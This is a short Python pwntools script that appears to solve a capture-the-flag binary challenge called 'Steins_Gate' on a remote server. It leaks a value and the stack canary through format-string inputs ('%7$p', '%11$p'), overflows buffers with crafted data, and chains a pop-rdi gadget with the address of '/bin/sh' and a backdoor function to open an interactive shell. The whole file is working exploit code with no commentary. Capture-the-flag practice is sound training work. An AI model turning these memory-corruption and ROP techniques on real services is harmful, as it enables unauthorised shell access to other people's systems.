from pwn import *
context.log_level = "debug"
# p = process("Steins_Gate")
p = remote("118.24.3.214" , 10002)

pop_rdi = 0x400c73
backdoor = 0x400A76
id_addr = 0x602040

p.sendafter("What's your ID:" , "/bin/sh\n")
p.sendafter("To seek the truth of the world.\n" , "a" * 0x30 + p32(0x2333))
p.sendafter("Repeater is nature of man.\n" , "%7$p")
result = eval(p.recv(10))
p.sendafter("You found it?\n" , "a" * 0x1c + p32(0x6666) + "a" * 0x10 + p32(result + 0x1234))

p.sendafter("Payment of past debts.\n" , "%11$p")

canary = eval(p.recv(18))
print("canary : " + hex(canary))
payload = "a" * 0x30 + p64(0x2333) + p64(canary) + "b" * 8 + p64(pop_rdi) + p64(id_addr) + p64(backdoor)
p.sendafter("To seek the truth of the world.\n" , payload)
p.interactive()





